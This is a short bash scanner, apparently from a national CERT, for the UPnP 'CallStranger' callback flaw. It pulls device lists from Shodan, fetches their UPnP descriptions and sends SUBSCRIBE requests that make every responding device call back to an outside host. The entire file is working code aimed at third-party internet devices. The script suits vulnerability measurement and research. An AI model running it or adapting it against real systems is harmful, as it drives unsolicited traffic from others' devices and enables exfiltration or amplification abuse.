#!/bin/bash

## Dirty callstranger scanner :)
# 
# usage:
# 1. shodan download port1900.json "port:1900 country:SK"
# 2. gunzip port1900.json.gz
# 3. ./dirty_scan.sh port1900.json http://x.x.x.x:80/callback
# 4. ...
# 5. profit? (check you httpd logs on callback host)
#
# dependencies: jq, curl, shodan
#

# jsk @ SK-CERT, 2020-04-13


fail() {
	echo "$*" 1>&2
	exit 1
}

[ $# -eq 2 ] || fail "usage: $0 port1900.json CALLBACK"

CALLBACK="$2"
WORK_DIR="live/"
SSDP_TIMEOUT=10
SSDP_SLEEP=0.5
UPNP_TIMEOUT=20
UPNP_SLEEP=3
CALLBACK_TIMEOUT=180

fix_url() {
	echo "$2" | sed 's/:\/\/[^:\/]*\([:\/]\)/:\/\/'$1'\1/'
}

upnp_subscribe() {
	CODE=$( curl --connect-timeout $UPNP_TIMEOUT -o /dev/null -s -w "%{http_code}\n" -X SUBSCRIBE -H "NT: upnp:event" -H "TIMEOUT: Second-$CALLBACK_TIMEOUT" -H "CALLBACK: <$CALLBACK>" "$1" )
	RES=$?
	echo "$1;$RES;$CODE"
}

for HOST in $( jq -r .ip_str "$1" | sort | uniq | shuf ); do
	# FIXME: only one location per ssdp response
	ORIG_URL=$( grep "$HOST" "$1" | jq 'select(.ip_str=="'$HOST'") | .data' | sed 's/[\\r]*\\n/\n/g' | grep -i location | head -n 1 | cut -d':' -f 2- | sed 's/^ //g' )
	FIXED_URL=$( fix_url "$HOST" "$ORIG_URL" )
	BASE_URL=$( echo "$FIXED_URL" | cut -d'/' -f 1-3 )

	#XXX: if you don't want caching, uncomment following line
	if [ ! -f "$WORK_DIR/$HOST.xml" ]; then
		echo "download $HOST from '$FIXED_URL' ..."
		curl -s --connect-timeout $SSDP_TIMEOUT --max-time $SSDP_TIMEOUT -H 'User-Agent:' -o "$WORK_DIR/$HOST.xml" "$FIXED_URL"
	fi

	[ -f "$WORK_DIR/$HOST.xml" ] || continue

	for EVENT_URL in $( grep -ioh 'eventSubURL>\([^<]*\)<' "$WORK_DIR/$HOST.xml" | cut -d'>' -f 2 | cut -d '<' -f 1); do
		# skip blanks and "(null)" urls... <3 IOT
		[ "x$EVENT_URL" == "x" ] && continue
		[[ "x$EVENT_URL" =~ [/]?(null) ]] && continue

		# fix url as some might contain full URL 
		# (yes, i'm looking at you "MPEG4 LANCAM Series - RaciborWebCam")
		if [[ "$EVENT_URL" =~ :// ]]; then
			URL=$( fix_url "$HOST" "$EVENT_URL" )
			echo "weird url $URL orig $EVENT_URL"
		else
			URL="$BASE_URL$EVENT_URL"
		fi

		# perform SUBSCRIBE call
		upnp_subscribe "$URL"
		sleep $UPNP_SLEEP
	done

	sleep $SSDP_SLEEP
done
